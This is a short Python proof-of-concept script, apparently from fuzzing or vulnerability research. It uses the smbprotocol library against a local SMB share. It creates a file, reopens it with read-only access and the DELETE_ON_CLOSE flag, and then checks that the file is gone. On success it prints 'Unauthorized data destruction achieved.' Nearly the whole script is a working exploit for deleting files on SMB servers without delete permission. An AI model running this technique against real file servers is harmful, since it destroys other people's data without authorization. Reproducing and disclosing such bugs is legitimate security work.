"""Confirm: file IS deleted after DELETE_ON_CLOSE without DELETE permission."""
from smbprotocol.connection import Connection, Dialects
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.open import Open, CreateDisposition, ShareAccess, CreateOptions, FilePipePrinterAccessMask
import uuid

c = Connection(uuid.uuid4(), "127.0.0.1", 445)
c.connect(Dialects.SMB_3_0_0)
s = Session(c, "fuzz", "fuzz")
s.connect()
t = TreeConnect(s, r"\\127.0.0.1\privtest")
t.connect()

# Create target
o = Open(t, "victim_file")
o.create(0, 0x12019F, 0x80, 7, CreateDisposition.FILE_OPEN_IF, CreateOptions.FILE_NON_DIRECTORY_FILE)
o.write(b"IMPORTANT DATA - DO NOT DELETE", 0)
o.close()
print("1. Created victim_file with important data")

# Verify it exists
o2 = Open(t, "victim_file")
o2.create(0, FilePipePrinterAccessMask.FILE_READ_DATA, 0x80, 7,
          CreateDisposition.FILE_OPEN, CreateOptions.FILE_NON_DIRECTORY_FILE)
data = o2.read(0, 30)
print(f"2. Verified file exists: '{data.decode()}'")
o2.close()

# Now open with DELETE_ON_CLOSE but NO DELETE access
o3 = Open(t, "victim_file")
o3.create(0, FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES,
          0x80, 7, CreateDisposition.FILE_OPEN,
          CreateOptions.FILE_NON_DIRECTORY_FILE | CreateOptions.FILE_DELETE_ON_CLOSE)
print("3. Opened with READ-ONLY + DELETE_ON_CLOSE (no DELETE permission!)")
o3.close()
print("4. Closed handle — file should now be deleted")

# Try to open again — should fail with NOT_FOUND
try:
    o4 = Open(t, "victim_file")
    o4.create(0, FilePipePrinterAccessMask.FILE_READ_DATA, 0x80, 7,
              CreateDisposition.FILE_OPEN, CreateOptions.FILE_NON_DIRECTORY_FILE)
    print("[SURPRISE] File still exists! DELETE_ON_CLOSE didn't work")
    o4.close()
except Exception as e:
    if "NOT_FOUND" in str(e) or "NO_SUCH_FILE" in str(e) or "OBJECT_NAME_NOT_FOUND" in str(e):
        print("[BUG CONFIRMED] File DELETED without DELETE permission!")
        print("                Unauthorized data destruction achieved.")
    else:
        print(f"[?] Open failed: {str(e)[:80]}")

t.disconnect(); s.disconnect(); c.disconnect()
